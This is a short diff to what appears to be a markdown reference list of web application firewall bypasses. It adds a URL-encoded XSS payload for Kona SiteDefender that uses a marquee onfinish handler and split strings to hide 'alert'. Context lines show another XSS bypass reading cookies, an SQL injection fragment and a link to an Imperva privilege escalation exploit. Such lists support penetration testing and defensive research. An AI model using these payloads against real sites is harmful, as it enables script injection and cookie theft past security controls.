@@ -3663,6 +3663,10 @@ stringindatasetchoosen%%' and 1 = any (select 1 from SECURE.CONF_SECURE_MEMBERS 
 - [Imperva SecureSphere <= v13 - Privilege Escalation](https://www.exploit-db.com/exploits/45130) by [@0x09AL](https://www.exploit-db.com/?author=8991)
 
 ### Kona SiteDefender
+- [XSS Bypass](https://twitter.com/XSaadAhmedX/status/1482398313227948034) by [@SaadAhmed](https://twitter.com/XSaadAhmedX)
+```
+%3Cmarquee%20loop=1%20width=%271%26apos;%27onfinish=self[`al`+`ert`](1)%3E%23leet%3C/marquee%3E
+```
 - [XSS Bypass](https://twitter.com/h1_kenan/status/1185826172308983808) by [@h1_kenan](https://twitter.com/h1_kenan)
 ```
 asd"on+<>+onpointerenter%3d"x%3dconfirm,x(cookie)
